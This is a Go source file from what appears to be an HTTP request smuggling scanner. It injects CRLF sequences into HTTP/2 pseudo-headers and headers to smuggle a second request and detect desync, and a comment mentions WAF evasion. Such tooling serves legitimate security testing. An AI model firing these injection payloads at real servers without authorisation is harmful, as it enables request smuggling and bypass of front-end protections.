package smuggler

import (
	"smuggler/smuggler/h2"
	"smuggler/utils"

	"github.com/rs/zerolog/log"
)

type Tunnel struct {
	*DesyncerImpl

	hdr map[string][]string
}

type tName struct {
	name      string
	test      string
	confirm   string
	modifyReq func(*h2.Request, string)
}

func (t *Tunnel) Run() bool {
	t.hdr = make(map[string][]string)
	t.hdr = utils.CloneMap(t.Hdr)

	baseReq := func() *h2.Request {
		url := *t.URL
		return &h2.Request{
			Method: t.Method,
			Hdrs:   t.hdr,
			URL:    &url,
		}
	}

	c := []tName{
		{
			name:    "method",
			test:    "GET / HTTP/1.1\r\nFoo: bar",
			confirm: "GET / HTTP/1.1\r\nHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.Method = p
			},
		},
		{
			name:    "authority",
			test:    "\r\nFoo: bar",
			confirm: "\r\rHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.URL.Host += p
			},
		},
		{
			name:    "scheme",
			test:    "\r\nFoo: bar",
			confirm: "\r\rHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.URL.Scheme += p
			},
		},
		{
			name:    "path",
			test:    "?a=b HTTP/1.1\r\nFoo: bar",
			confirm: "?a=b HTTP/1.1\r\nHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.URL.Path += p
			},
		},
		{
			name:    "custom header key",
			test:    "foo: bar\r\nx-my-hdr: x-val",
			confirm: "foo: bar\r\nhost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.Hdrs = utils.CloneMap(t.hdr)
				r.Hdrs[p] = []string{"bar"}
			},
		},
		{
			name:    "custom header value",
			test:    "bar\r\nx-my-hdr: x-val",
			confirm: "bar\r\nhost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.Hdrs = utils.CloneMap(t.hdr)
				r.Hdrs["foo"] = []string{p}
			},
		},
	}

	// might add more payloads (crlf sequence for waf evasion)
	transport := h2.Transport{}
	for _, v := range c {
		req := baseReq()
		v.modifyReq(req, v.test)

		resp, err := transport.RoundTrip(req)
		if err != nil {
			log.Debug().Err(err).Str("endpoint", req.URL.String()).Msg("")
			continue
		}
		resp.Body.Close()

		if resp.StatusCode >= 400 {
			log.Debug().
				Str("endpoint", req.URL.String()).
				Msgf("response received with %s", resp.Status)
			continue
		}

		v.modifyReq(req, v.confirm)
		resp, err = transport.RoundTrip(req)
		if err != nil {
			log.Debug().Err(err).Msg("")
			continue
		}
		resp.Body.Close()
		log.Info().
			Str("endpoint", req.URL.String()).
			Str("payload", utils.GetH2RequestSummary(req)).
			// Str("status", resp.Status).
			Int("status", resp.StatusCode).
			Msgf("%s injection might be interesting", v.name)
	}
	return false
}
